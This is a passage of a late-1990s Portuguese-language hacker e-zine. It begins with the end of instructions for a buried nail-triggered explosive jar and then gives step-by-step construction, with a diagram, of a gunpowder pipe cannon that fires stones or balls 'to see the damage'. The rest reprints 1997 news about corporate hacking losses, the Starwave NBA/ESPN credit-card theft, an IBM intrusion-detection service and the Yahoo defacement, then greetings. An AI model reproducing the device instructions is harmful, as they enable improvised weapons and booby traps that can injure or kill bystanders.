+Obs: apesar de aparecerem tres "!" elas siginificam apenas
+um prego grande.
+
+COMO USAR:
+
+   Enterre o pote de forma que fique somente o prego apare-
+cendo, entao quando algo  fizer pressao  sobre  o prego e o
+mesmo entrar no pote KAABOOOMMM.
+
+____________________________________________________________________________________
+
+
+                         BoMBaZ, BoMbAz, BoMbAz!!!
+ Nao sei pq esse titulo!! heheh vo taka aqui como fazer um Minicanhao!!!
+ ‚ muito ridiculo!!! mais ai vai!!! hehehe :-)
+
+ Projeto - Minicanhão
+ ^^^^^^^^^^^^^^^^^^^^
+        
+        Ingredientes:
+        ^^^^^^^^^^^^^
+                Para fazer este minicanhão voce vai precisar de:
+        * 1 tubo (de PVC ou metal,de metal é mais seguro) de 40 CM
+        
+        * 3 tabletes de durepox
+
+        * 1 tampa com rosca para o tubo ( o nome  eu nao me lembro 
+        mas  em   qualquer  loja  de  material  de  contrução tem)
+        prefira os de metal
+
+        * Polvora (veja a receita no AO-L #1)
+
+        * bolas, pedras ou qualquer objeto que caiba dentro do tubo
+        e que se encaixe bem dentro dele
+
+        * 1 furadeira
+
+        * 1 broca fina
+
+        * 1 pavio (veja receito abaixo desta matéria)
+        
+        Preparo:
+        ^^^^^^^^
+                Pegue o tubo e enrrosque  a tampa numa das pontas . 
+        Passe uma  camada  de  durepox  ao  redor do tubo e sobre a 
+        tampa para fortalecê-lo. Deixe o durepox endurecer , e faça
+        um furo no  cano proximo a tampa. Ponha o pavio no buraco e
+        ponha  um  pouco  de  pólvora  dentro  do tubo , comprima a 
+        pólvora levemente . Ponha  a  bola ou qualquer outro objeto 
+        que você queira que seja lançado. Quando  pronto  o  canhão
+        deve ser mais ou menos assim:
+
+              \\
+           ****\\***********************************
+          *=====\\==================================
+          *|++++++++(-)
+          *|++++++++(_)
+          *=========================================
+           *****************************************
+        Legenda:
+        ^^^^^^^^
+        *   -> Durepox
+        =   -> Cano
+        |   -> Tampa
+        +   -> Pólvora
+        \\  -> Pavio
+        (-) -\ BOLA
+        (_) -/ 
+        
+        Uso:
+        ^^^^
+                Deixe o minicanhão  apoiado  firmemente  em  alguma 
+        coisa acenda o pavio e  saia de perto, depois do disparo vá
+        ver o estrago que voce provocou.
+
+
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+
+
+                                8- News Hacker
+
+
+Hackers causaram prejuizo de US$ 100 milhoes
+
+
+
+Se voce ainda acredita que hacker e apenas uma invencao da industria
+cinematografica, esta na hora de mudar de opiniao. Estudo conduzido
+pelo FBI junto ao Computer Security Institute (CSI), aponta que 75%
+de 563 especialistas em sistemas de seguranca das maiores companhias
+americanas entrevistados relataram perdas financeiras no ultimo trimestre
+devido a brechas nos sistemas de seguranca das empresas em que trabalham.
+As invasoes dos hackers foram realizadas com intencao de fraudes 
+financeiras, roubos de informacoes sigilosas e sabotagens usando
+virus de computador. A soma dos danos a 249 companhias entrevistadas
+totalizou mais de US$ 100 milhoes - em estimativa conservadora. "Boa
+parte das empresas ainda nao sabe como reportar esse tipo de crime as
+autoridades e muitas nao identificam sequer o ataque de hackers a seus
+sistemas", disse Patrice Rapalus, diretor do CSI. Ha outros dados
+importantes apontados pelo estudo. Aumentou em 10% o numero de gerentes
+de CDP que citam a conexao de Internet como frequente ponto de ataque dos
+hackers. Enquanto 43% dos entrevistados aponta que suas empresas foram
+atacadas por agentes externos entre 1 e 5 vezes, 45% dos questionarios
+nao esclarecem se esses ataques foram realizados interna ou externamente.
+Mais de 60% das pessoas que responderam aos questionarios dizem que nao
+existe em suas companhias um responsavel para agir em caso de emergencia
+contra um ataque de hackers. Outra estatistica gritante: apenas 17% dos
+casos de ataques contra os sistemas das empresas foram relatados as
+autoridades do pais.
+
+
+ Fonte: ZAZ/IDG
+ Data: 10/07/97
+
+
+
+
+
+
+Ataque de Hackers nos sites da NBA e ESPN
+
+
+
+Os usuarios da rede que compraram itens nos sites ESPNet ou NBA Store
+essa semana levaram um susto: receberam mensagens anonimas por e-mail
+avisando que foram vitimas da falta de seguranca nos sites e que seus
+numeros de cartoes de credito e enderecos estavam facilmente disponiveis.
+O provedor dos sites - a Starwave Corp. - decidiu enviar tambem uma 
+mensagem, esta pelo correio normal, a 2.397 compradores online, alertando
+que informacoes de seus cartoes de credito poderiam estar sendo usadas
+de maneira impropria. Segundo a empresa, as informacoes estavam numa area
+segura e criptografada dos sites, mas que foi acessada por um invasor que
+tinha a senha necessaria.
+"Isso nao foi feito por um hacker", disse um representante da Starwave.
+Eles sabiam como entrar no sistema e usar ilegalmente informacao
+classificada. A area invadida era um sistema de processamento que envia os
+pedidos dos compradores de cada site para a 1-800-PRO-TEAM, uma companhia
+americana de preenchimento.
+A Starwave chamou o FBI e o Servico Secreto Americano para investigar o 
+caso e descobrir o intruso. Tambem implementou um novo processo de 
+criptografia e mudou todas as senhas do sistema. Nos achamos que a senha
+foi usada diretamente por alguem envolvido com o sistema, ou passada
+dessa pessoa para outra.
+
+
+ Fonte: ZAZ/IDG
+ Data: 10/07/97 
+
+
+
+
+
+
+
+
+Credit data taken off NBA, ESPN sites
+
+( Meu ingles ‚ um lixo!!entao nem "tentei"traduzir!!! bah!!)
+
+Starwave which hosts the popular NBA and ESPN sports sites, is warning
+customers to contact their creditors in the wake of news about an 
+"intruder" who took credit card numbers from the ESPN and NBA Web sites
+and then sent messages to the card owners, warning them about the alleged
+security flaws.It appears that the intruder never used or intended to use
+the credit card numbers, though. Patrick Naughton, president and chief
+technology officer at Starwave, said the alleged burglar did not perform
+any complex hacks to break into the sites, but instead used a password to
+get in and download credit card numbers from people who had made Net 
+purchases that day. Naughton added a few people had the password, which is
+used to access credit card numbers by both employees at the company and at
+buildings where the actual merchandise is stored. "We don't know who it 
+is," he said. "We don't know how they got it. Some people have it as a 
+matter of business." Naughton noted that he's pretty sure, however, that 
+digital traces will lead him to the person who did it. Naughton refused to
+label the act either a hack or a break-in. But in the email he sent to 
+2,397 customers, he called the perpetrator an "intruder" and said that 
+Starwave changed all passwords and added a level of encryption to credit 
+card data. He also said the company has contacted authorities including 
+the FBI, the Secret Service, and credit card issuers.
+So far, there is no evidence that shows the intruder actually used the 
+cards. Instead, it seems that he took the data and used it to send messages
+to credit card owners, warning them of alleged security problems.
+"Beware Michael Williams!" began one email sent to Williams, who had bought
+a New York Knicks T-shirt for his father's birthday on one of the sites.
+"You are the victim of a careless abuse of privacy and security. Your 
+recent use of a credit card on 'zonestore-espnet.sportszone.com' or 
+'store.nba.com' is documented in a simple text file on a Web page with 
+practically no  security. One of our associates found the URL posted in a
+Usenet group." The message also gave Williams his address, phone number, 
+and the last eight digits of his credit card number. It also stated: "We 
+feel the victims of this abuse deserve to know the truth."
+In addition, it recommended that Williams contact his credit card company.
+"Clearly, [Starwave] doesn't consider the protection of individual
+credit card numbers a worthwhile endeavor. (This is one of the worst 
+implementations of security we've seen.) Because of the potential danger to
+you, we suggest you cancel your credit card immediately and check with your
+local authorities regarding any specific rights you may have in this matter.
+"This notice was sent on behalf of an anonymous organization seeking to make
+the Internet a safe place for the consumer to do business," the email 
+concludes. But Starwave's Naughton said there were no inherent security 
+flaws on the sites, likening the alleged crime to an employee with access
+to an office who takes a file with credit card numbers from someone's desk 
+or downloads credit card data onto a computer disk, leaves with that 
+information, and then warns everyone about a security problem because 
+nothing stopped him or her.
+Naughton also reassured Netizens in the Starwave letter that this was an 
+isolated event. "We have determined this incident was not a random person
+hacking past security measures, rather someone who unlawfully used inside
+information to commit this crime." "My belief is they have no intention of
+selling or brokering the credit card information," Naughton said of the
+perpetrators. "They just wanted to make a statement to the Net. Ironically,
+it's not a statement about the Internet at all. If I have keys to a building
+that doesn't have armed guards, I can open the building and get in." 
+Williams, who called the email with his information "disconcerting," said he
+was never alarmed because "I do not feel I would be liable for any of the 
+improper charges." He added that after getting Naughton's letter, he was 
+even less concerned. "I have faith in American Express to help me with any
+problems that may arise."
+
+
+ Source: C|Net News
+ Date: 10/07/97 
+
+
+
+
+IBM lança alarme contra Hackers
+
+
+
+A IBM anunciou, durante a feira Internet World'97, que acontece esta
+semana em Chicago, um alarme "contra ladroes" como parte de seus
+servicos de atendimento a emergencia na Internet. O alarme e, na 
+verdade, um sistema de deteccao de invasao destinado aos clientes que
+participam de transacoes eletronicas. O sistema permite aos experts em
+segurança da IBM detectarem, em tempo real, tentativas de violacao a 
+redes de consumidores atraves do uso de sensores NetRanger do WheelGroup.
+Uma vez alertada, a IBM pode ligar para os clientes e avisa-los que
+estao sofrendo um ataque. Alguns consumidores estao testando o produto
+que sera lancado nos EUA em outubro e no mundo inteiro no inicio de 1998. 
+A empresa esta investindo em outros servicos de atendimento a emergencia
+na Internet. Entre eles, esta o "hacking Etico", um ataque proposital,
+feito pelo laboratario de analises de seguranca global da IBM, que tenta
+invadir os sites para avaliar se seus pontos fracos podem ser do 
+conhecimento dos usuarios antes que um ataque ocorra. Outra modalidade e o
+atendimento a emergencias no meio da noite. Neste caso, a IBM desloca
+funcionarios para tirar o site da rede e avaliar qual informacao foi vitima
+de hacking. As empresas interessadas nesse tipo de atendimento devem
+desembolsar US$ 75 mil por ano, incluindo o sistema de detecaoo de invasao.
+
+
+ Fonte: ZAZ/IDG
+ Data: 26/07/97 
+
+
+
+
+
+
+                     ATAQUE FEITO A YAHOO!
+
+
+
+
+ O Yahoo, o catalogo de paginas Web mais visitada do ciberespaço, sofreu um ataque de
+ hackers. Eles "derrubaram" o site numa segunda-feira, durante 15 minutos, e ameaçaram lançar
+ um vírus de computador que destruiria os arquivos do Yahoo. O ataque teve como objetivo
+ forçar a liberação do hacker Kevin Mitnick. 
+
+ Kevin Mitnick foi preso em 1995, depois de fraudes com cartões de crédito feitas nos sistemas
+ de home banking e Internet banking. 
+
+ Os hackers, quando atacaram o site, colocaram uma mensagem assustadora na página: 
+
+ "Durante todo o mês passado, todos que visitaram têm uma bomba implantada nos seus
+ computadores. 
+ No dia do Natal, esta bomba se ativará". A mensagem prosseguia informando que havia um
+ "código que funcionaria como antídoto" e que o Governo americano teria acesso a este código,
+ caso libertasse o hacker preso. 
+
+ Os administradores do Yahoo procuraram tranqüilizar os internautas que visitam o site,
+ garantindo que nenhum computador de visitantes seria atingido. Segundo a porta-voz do Yahoo,
+ nenhum vírus foi detectado e, além disso, a mensagem só teria sido vista por internautas que
+ usam o browser Lynx, usado por menos de 1% dos 26 milhões de pessoas que acessam o site
+ mensalmente. 
+
+ Fiquei sabendo que a Yahoo usa um sistema onde diferentes browsers usam diferentes
+ servidores web. Por isso apenas usuários do lynx (e talvez usuários de versões muito antigas do
+ Netscape) viram a página.
+
+ As áreas afetadas estão localizadas na central de dados Globalcenter. Ele fornece serviços de
+ servidor para Yahoo (e alguns outros sites).
+
+ Fui informado que o ataque atualmente veio de dentro do firewall através de um modem dialup.
+ As senhas para conta de usuários nas máquinas foram comprometidas.
+
+ Você pode ver uma cópia da homepage hackeada em:
+
+ http://www.clipper.net/~skully/yahoo/
+
+                  Note que a página tinha um link para:
+
+ http://www.yahoo.com/yahooz-el8-search-engine-src.zip
+
+ Imagine se o código fonte do sistema de pesquisa do Yahoo estava realmente ali e se alguém
+ copiou ele.
+
+ A questão real, que irá ficar provavelmente sem resposta é qual era o furo? A primeira opção na
+ lista é um defeito no DNS que redirecionava a página da Yahoo para algum outro servidor Web,
+ mas o que não cheira bem é que a Yahoo foi capaz de resolver o problema depois de eles
+ disseram o que estava havendo.
+
+ Há especulação (sem confirmação, em todos na Yahoo! Incluindo Filo, que está mantendo esse
+ debate) que o servidor web da Yahoo foi feito em uma versão antiga do Apache e no processo
+ eles podem ter neglegenciado em resolver algum(ns) dos furos das versões antigas do Apache.
+
+ Em qualquer caso, as palavras que supostamente veio da Yahoo foi que esse exploit não tem
+ efeito sobre outros servidores FreeBSD. Assim, esse deve ser um caso de um erro de alguma
+ versão do Apache, ou algum código mal feito em CGI (talvez a administração remota) pode ter
+ causado isso.
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+
+Bah!!cabo!! quem tiver mais pode me manda por Mail!! que eu ponho no zine!!
+bla bla bla!!  Ahhh JuRo que eu nao sou o author de nenhum desses feitos ae..!
+heheheheh
+
+----======----------=================-------------============--------======------========-
+
+    9- Agradecimentos!!!
+
+
+
+
+    AOL= Anarchy on LiNe ZiNe
+
+    RoTTer      ( www.vorteck.com/UoBrazil)  GaMe!!! Ultima on LiNe!! 
+    
+    JoKer's Page
+
+    Lebeau Page
+
+    Phanton Phreak  da Psychos Undergroud Team
+    e outros!!!
+
+<><><><><><><><><><><><><><><><>----===================-----------------==========
+
+Mail to:
+
+  funboy_66@hotmail.com
+  http://www.angelfire.com/ak/FunBoY      ( OBs.: Digitem do mesmo geito que
+  eu escrevi o FunBoY, pq c nao....naum acha a HP)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
